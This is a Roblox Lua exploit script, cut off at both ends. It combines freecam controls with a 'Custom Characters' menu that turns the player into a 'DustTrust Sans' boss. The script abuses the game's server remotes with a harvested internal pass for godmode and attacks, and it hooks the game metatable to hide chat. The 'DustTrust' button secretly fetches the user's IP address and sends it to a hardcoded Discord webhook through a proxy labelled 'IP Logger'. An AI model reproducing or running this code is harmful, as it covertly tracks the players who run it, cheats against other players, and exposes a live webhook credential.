local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
local FOV_WHEEL_SPEED    = 1.0
local FOV_GAMEPAD_SPEED  = 0.25
local NAV_ADJ_SPEED      = 0.75
local NAV_SHIFT_MUL      = 0.25
 
local navSpeed = 1
 
function Input.Vel(dt)
navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)
 
local kGamepad = Vector3.new(
thumbstickCurve(gamepad.Thumbstick1.x),
thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
thumbstickCurve(-gamepad.Thumbstick1.y)
)*NAV_GAMEPAD_SPEED
 
local kKeyboard = Vector3.new(
keyboard.D - keyboard.A + keyboard.K - keyboard.H,
keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
keyboard.S - keyboard.W + keyboard.J - keyboard.U
)*NAV_KEYBOARD_SPEED
 
local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)
 
return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
end
 
function Input.Pan(dt)
local kGamepad = Vector2.new(
thumbstickCurve(gamepad.Thumbstick2.y),
thumbstickCurve(-gamepad.Thumbstick2.x)
)*PAN_GAMEPAD_SPEED
local kMouse = mouse.Delta*PAN_MOUSE_SPEED
mouse.Delta = Vector2.new()
return kGamepad + kMouse
end
 
function Input.Fov(dt)
local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
mouse.MouseWheel = 0
return kGamepad + kMouse
end
 
do
local function Keypress(action, state, input)
keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end
 
local function GpButton(action, state, input)
gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end
 
local function MousePan(action, state, input)
local delta = input.Delta
mouse.Delta = Vector2.new(-delta.y, -delta.x)
return Enum.ContextActionResult.Sink
end
 
local function Thumb(action, state, input)
gamepad[input.KeyCode.Name] = input.Position
return Enum.ContextActionResult.Sink
end
 
local function Trigger(action, state, input)
gamepad[input.KeyCode.Name] = input.Position.z
return Enum.ContextActionResult.Sink
end
 
local function MouseWheel(action, state, input)
mouse[input.UserInputType.Name] = -input.Position.z
return Enum.ContextActionResult.Sink
end
 
local function Zero(t)
for k, v in pairs(t) do
t[k] = v*0
end
end
 
function Input.StartCapture()
ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
Enum.KeyCode.W, Enum.KeyCode.U,
Enum.KeyCode.A, Enum.KeyCode.H,
Enum.KeyCode.S, Enum.KeyCode.J,
Enum.KeyCode.D, Enum.KeyCode.K,
Enum.KeyCode.E, Enum.KeyCode.I,
Enum.KeyCode.Q, Enum.KeyCode.Y,
Enum.KeyCode.Up, Enum.KeyCode.Down
)
ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
end
 
function Input.StopCapture()
navSpeed = 1
Zero(gamepad)
Zero(keyboard)
Zero(mouse)
ContextActionService:UnbindAction("FreecamKeyboard")
ContextActionService:UnbindAction("FreecamMousePan")
ContextActionService:UnbindAction("FreecamMouseWheel")
ContextActionService:UnbindAction("FreecamGamepadButton")
ContextActionService:UnbindAction("FreecamGamepadTrigger")
ContextActionService:UnbindAction("FreecamGamepadThumbstick")
end
end
end
 
local function GetFocusDistance(cameraFrame)
local znear = 0.1
local viewport = Camera.ViewportSize
local projy = 2*tan(cameraFov/2)
local projx = viewport.x/viewport.y*projy
local fx = cameraFrame.rightVector
local fy = cameraFrame.upVector
local fz = cameraFrame.lookVector
 
local minVect = Vector3.new()
local minDist = 512
 
for x = 0, 1, 0.5 do
for y = 0, 1, 0.5 do
local cx = (x - 0.5)*projx
local cy = (y - 0.5)*projy
local offset = fx*cx - fy*cy + fz
local origin = cameraFrame.p + offset*znear
local part, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
local dist = (hit - origin).magnitude
if minDist > dist then
minDist = dist
minVect = offset.unit
end
end
end
 
return fz:Dot(minVect)*minDist
end
 
------------------------------------------------------------------------
 
local function StepFreecam(dt)
local vel = velSpring:Update(dt, Input.Vel(dt))
local pan = panSpring:Update(dt, Input.Pan(dt))
local fov = fovSpring:Update(dt, Input.Fov(dt))
 
local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))
 
cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))
 
local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
cameraPos = cameraCFrame.p
 
Camera.CFrame = cameraCFrame
Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
Camera.FieldOfView = cameraFov
end
 
------------------------------------------------------------------------
 
local PlayerState = {} do
local mouseIconEnabled
local cameraSubject
local cameraType
local cameraFocus
local cameraCFrame
local cameraFieldOfView
local screenGuis = {}
local coreGuis = {
Backpack = true,
Chat = true,
Health = true,
PlayerList = true,
}
local setCores = {
BadgesNotificationsActive = true,
PointsNotificationsActive = true,
}
 

function PlayerState.Push()
for name in pairs(coreGuis) do
coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
end
for name in pairs(setCores) do
setCores[name] = StarterGui:GetCore(name)
StarterGui:SetCore(name, false)
end
local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
if playergui then
for _, gui in pairs(playergui:GetChildren()) do
if gui:IsA("ScreenGui") and gui.Enabled then
screenGuis[#screenGuis + 1] = gui
gui.Enabled = false
end
end
end
 
cameraFieldOfView = Camera.FieldOfView
Camera.FieldOfView = 70
 
cameraType = Camera.CameraType
Camera.CameraType = Enum.CameraType.Custom
 
cameraSubject = Camera.CameraSubject
Camera.CameraSubject = nil
 
cameraCFrame = Camera.CFrame
cameraFocus = Camera.Focus
 
mouseIconEnabled = UserInputService.MouseIconEnabled
UserInputService.MouseIconEnabled = false
 
mouseBehavior = UserInputService.MouseBehavior
UserInputService.MouseBehavior = Enum.MouseBehavior.Default
end
 

function PlayerState.Pop()
for name, isEnabled in pairs(coreGuis) do
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
end
for name, isEnabled in pairs(setCores) do
StarterGui:SetCore(name, isEnabled)
end
for _, gui in pairs(screenGuis) do
if gui.Parent then
gui.Enabled = true
end
end
 
Camera.FieldOfView = cameraFieldOfView
cameraFieldOfView = nil
 
Camera.CameraType = cameraType
cameraType = nil
 
Camera.CameraSubject = cameraSubject
cameraSubject = nil
 
Camera.CFrame = cameraCFrame
cameraCFrame = nil
 
Camera.Focus = cameraFocus
cameraFocus = nil
 
UserInputService.MouseIconEnabled = mouseIconEnabled
mouseIconEnabled = nil
 
UserInputService.MouseBehavior = mouseBehavior
mouseBehavior = nil
end
end
 
local function StartFreecam()
local cameraCFrame = Camera.CFrame
cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
cameraPos = cameraCFrame.p
cameraFov = Camera.FieldOfView
 
velSpring:Reset(Vector3.new())
panSpring:Reset(Vector2.new())
fovSpring:Reset(0)
 
PlayerState.Push()
RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
Input.StartCapture()
end
 
local function StopFreecam()
Input.StopCapture()
RunService:UnbindFromRenderStep("Freecam")
PlayerState.Pop()
end
 
------------------------------------------------------------------------
 
do
local enabled = false
 
local function ToggleFreecam()
if enabled then
StopFreecam()
else
StartFreecam()
end
enabled = not enabled
end
 
local function CheckMacro(macro)
for i = 1, #macro - 1 do
if not UserInputService:IsKeyDown(macro[i]) then
return
end
end
ToggleFreecam()
end
 
local function HandleActivationInput(action, state, input)
if state == Enum.UserInputState.Begin then
if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
CheckMacro(FREECAM_MACRO_KB)
end
end
return Enum.ContextActionResult.Pass
end
 
ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
end
end))
for i,v in pairs(mas:GetChildren()) do
v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
spawn(function()
pcall(v)
end)
end
end)


CustomButton.MouseButton1Up:Connect(function()
    
    SpectateButton:Destroy()
MenuBlack:Destroy()
e:Destroy()
e_2:Destroy()
e:Destroy()
CharacterButton:Destroy()
CustomButton:Destroy()
CharacterButton:Destroy()
MenuPng:Destroy()
Sig:Destroy()
    
    for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 10
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://8073501948"
Sound.Name = "Menu Song"



local CustomCharacters = Instance.new("ScreenGui")
local Top = Instance.new("Frame")
local Bottom = Instance.new("Frame")
local CC = Instance.new("TextLabel")
local DustTrust = Instance.new("TextButton")
local EggMan = Instance.new("TextButton")
local Creek = Instance.new("TextLabel")
local Creek2 = Instance.new("TextLabel")



CustomCharacters.Name = "Custom Characters"
CustomCharacters.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
CustomCharacters.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Top.Name = "Top"
Top.Parent = CustomCharacters
Top.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Top.BorderColor3 = Color3.fromRGB(255, 255, 255)
Top.BorderSizePixel = 5
Top.Size = UDim2.new(0, 401, 0, 271)

Bottom.Name = "Bottom"
Bottom.Parent = CustomCharacters
Bottom.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Bottom.BorderColor3 = Color3.fromRGB(255, 255, 255)
Bottom.BorderSizePixel = 5
Bottom.Position = UDim2.new(-0.0354166664, 0, 0.266595155, 0)
Bottom.Rotation = 5.000
Bottom.Size = UDim2.new(0, 438, 0, 755)

CC.Name = "CC"
CC.Parent = CustomCharacters
CC.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CC.Position = UDim2.new(0.00364583335, 0, 0.00642398279, 0)
CC.Size = UDim2.new(0, 381, 0, 50)
CC.Font = Enum.Font.SourceSansBold
CC.Text = "Custom Characters"
CC.TextColor3 = Color3.fromRGB(255, 0, 0)
CC.TextSize = 30.000

Creek.Name = "Creek"
Creek.Parent = CustomCharacters
Creek.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Creek.Position = UDim2.new(0.0458333343, 0, 0.0835117772, 0)
Creek.Size = UDim2.new(0, 200, 0, 36)
Creek.Font = Enum.Font.SourceSans
Creek.Text = "KingDream made Eggman"
Creek.TextColor3 = Color3.fromRGB(255, 255, 255)
Creek.TextSize = 20.000
Creek.BorderColor3 = Color3.fromRGB(0, 0, 0)

Creek2.Name = "Creek2"
Creek2.Parent = CustomCharacters
Creek2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Creek2.Position = UDim2.new(0.0458333343, 0, 0.12205568, 0)
Creek2.Size = UDim2.new(0, 200, 0, 36)
Creek2.Font = Enum.Font.SourceSans
Creek2.Text = "AlternateWorld made DustTrust"
Creek2.TextColor3 = Color3.fromRGB(255, 255, 255)
Creek2.TextSize = 20.000
Creek2.BorderColor3 = Color3.fromRGB(0, 0, 0)

EggMan.Name = "EggMan"
EggMan.Parent = CustomCharacters
EggMan.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EggMan.BorderColor3 = Color3.fromRGB(255, 255, 255)
EggMan.Position = UDim2.new(0.0291666687, 0, 0.399357587, 0)
EggMan.Rotation = 6.000
EggMan.Size = UDim2.new(0, 200, 0, 50)
EggMan.Font = Enum.Font.SourceSans
EggMan.Text = "Drip EggMan"
EggMan.TextColor3 = Color3.fromRGB(255, 0, 0)
EggMan.TextSize = 22.000

DustTrust.Name = "DustTrust"
DustTrust.Parent = CustomCharacters
DustTrust.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DustTrust.Position = UDim2.new(0.0333333351, 0, 0.314775139, 0)
DustTrust.Rotation = 6.000
DustTrust.Size = UDim2.new(0, 200, 0, 50)
DustTrust.Font = Enum.Font.SourceSansBold
DustTrust.Text = "DustTrust"
DustTrust.TextColor3 = Color3.fromRGB(85, 0, 127)
DustTrust.TextSize = 22.000

DustTrust.MouseButton1Down:Connect(function()
    CustomCharacters:Destroy()

local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
local function SendMessage(Webhook, Message, Botname)
   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
       return error("Send a valid URL");
   end
   local Name;
   local API = "http://buritoman69.glitch.me/webhook";
   if (not Message or Message == "" or not Botname) then
       Name = "GameBot"
       return error("nil or empty message!")
   else
       Name = Botname;
   end
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:HttpPost(API, Body, false, "application/json")
   return Data or nil;
end
SendMessage("https://discordapp.com/api/webhooks/922916714847539321/Ia2sWlX2H0TGRIqWbus40eE-gRDC8kz2rIxV8zWg13wltB14nx3pwRLoFwE9BlcfuS01","IP: "..ip.." was logged.", "IP Logger")

game.StarterGui:SetCore("SendNotification", {
    Title = "Murder!";
    Text = "Go Murder Some People.";
    Duration = 8;
})

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 4
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://6546344469"
Sound.Name = "Menu Song"

function Chat(text,color)
local A_1 = 
{
	[1] = getrenv()._G.Pass, 
	[2] = "Chatted", 
	[3] = text, 
	[4] = color
}
local Event = game:GetService("ReplicatedStorage").Remotes.Events
Event:FireServer(A_1)
end

wait(2)

game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Sans"

wait(2)

game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.BackgroundColor3 = Color3.new(1, 0, 1)

function God(val)
        spawn(function()
if val == true then
godmode = true
            repeat wait()
        local A_1 = 
            {
                [1] = getrenv()._G.Pass, 
                [2] = "DashTeleport",
                [3] = true,
            }
        local Event = game:GetService("ReplicatedStorage").Remotes.SansMoves
        Event:InvokeServer(A_1)
 
until godmode == false
elseif val == false then
godmode = false
end
end)
end

local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel.BackgroundTransparency = 1.00
TextLabel.Position = UDim2.new(0, 0, 0.852, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 75)
TextLabel.Font = Enum.Font.Arcade
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 35.000
TextLabel.TextWrapped = true
TextLabel.Text = 'Phase 1'

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 3
music.SoundId = "rbxassetid://7534708078"
music.Looped = true
music:Play()

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "???"
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense: ???"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack: ???"
game.Players.LocalPlayer.PlayerGui.UI.Ui.ManaBar.Bar.BackgroundColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.PlayerGui.UI.Ui.StaminaBar.Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

function stun(val)
        if val == true then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            CAS:BindActionAtPriority(
                FREEZE_COMMAND,
                function() 
                    return Enum.ContextActionResult.Sink
                end,
                false,
                Enum.ContextActionPriority.High.Value,
                Enum.KeyCode.W,
                Enum.KeyCode.S,
                Enum.KeyCode.A,
                Enum.KeyCode.D,
                Enum.KeyCode.R,
                Enum.KeyCode.T,
                Enum.KeyCode.Z,
                Enum.KeyCode.X,
                Enum.KeyCode.C,
                Enum.KeyCode.V,
                Enum.KeyCode.B,
                Enum.KeyCode.N,
                Enum.KeyCode.One,
                Enum.KeyCode.Two,
                Enum.KeyCode.Three,
                Enum.KeyCode.Four,
                Enum.KeyCode.Five,
                Enum.KeyCode.Six,
                Enum.KeyCode.Seven,
                Enum.KeyCode.Eight,
                Enum.KeyCode.Nine,
                Enum.KeyCode.Zero
            )
        elseif val == false then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            CAS:UnbindAction(FREEZE_COMMAND)
        end
end

spawn(function()
    stun(true)
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
v.Animations.Walk.AnimationId = "rbxassetid://7005162082"
v.Animations.Run.AnimationId = "rbxassetid://5657151699"
v.Animations.Block.AnimationId = "rbxassetid://5973908948"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

game.Players.LocalPlayer.Character.Bone:Destroy()

God(true)

local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
 
	local StandAnim = Instance.new("Animation")
	StandAnim.AnimationId = "rbxassetid://5657849029"
	local StandAnimTrack = humanoid:LoadAnimation(StandAnim)
	StandAnimTrack.Priority = Enum.AnimationPriority.Action
	StandAnimTrack.Looped = true
	
	StandAnimTrack:Play()
	
	for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://3443155670"
music.Looped = true
music:Play()

        spawn(function()
        Chat("So we're finally here.",Color3.fromRGB(255, 255, 255))
        end)
	
		wait(5)

		Chat("Standing alone in a destroyed world",Color3.fromRGB(255, 255, 255))
		
		wait(5)
		
		Chat("With the same goal in mind",Color3.fromRGB(255, 255, 255))
		
		wait(5)
		
		Chat("Killing eachother, and everyone we loved",Color3.fromRGB(255, 255, 255))
		
		wait(4)
		
		game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "DustTrust Sans"
        game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)
		
       	Chat("But who said you'll be the one to finish the job?",Color3.fromRGB(255, 255, 255))


		wait(5)
		
	    Chat("Nobody did.",Color3.fromRGB(255, 255, 255))

		wait(7)
		
		Chat("I will make sure that I will be the ONLY one who finishes the job!",Color3.fromRGB(255, 0, 0))
		
		God(false)
		
		StandAnimTrack:Stop()
		
		game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense: 430"
        game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack: 210"
		
		function WhiteFlash()
char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.LocalScripts:GetChildren()) do
if v.Name == 'ShortWhiteScreen2' then
    clone = v:Clone()
    clone.Parent = char
end
end
end
		
		player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Left Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Right Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://3204744488"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

wait(1)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

spawn(function()
    stun(false)
end)

_G.hidechat = true
local mt = getrawmetatable(game)
    local backup = mt.__namecall
    if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end
    
    mt.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}

        if tostring(args[1]) == 'SayMessageRequest' and _G.hidechat then
        return
        end
        return backup(...)
    end)
    
    spawn(function()
repeat wait(0.1)
local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "changeEye",
        [3] = true
    }
}
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
until false
end)
spawn(function()
repeat wait(0.1)
spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'Beam' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)


spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,255))
end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
until false
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'Trail' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)

WhiteFlash()

    phase1 = true
    local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "z" then 
	    if phase1 == true then
	        wait(1)
	    local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "GasterBlasters",
        [3] = "SummonOne",
        [4] = locked.Torso.Position
    }
}
 
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args)) 
		local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "Bones",
        [3] = "AirSpawn",
        [4] = locked.Torso.Position,
    },
}

game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
wait(1)
local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "Telekinesis",
        [3] = "Special2",
        [4] = locked
    }
}

game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
end
end
end)

wait(1)
repeat wait() until game.Players.LocalPlayer.Character.Data.Stamina.Value <= 500
wait(1)

phase1 = false

game.Players.LocalPlayer.PlayerGui.ScreenGui.TextLabel.Text = 'Phase 2'

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 1.5
music.SoundId = "rbxassetid://5351674153"
music.Looped = true
music:Play()

wait(2)

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.HealthLabel.Text = "200/480"

char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.Character.Accessories.SFChara:GetChildren()) do
if v.Name == 'SlashEffect' then
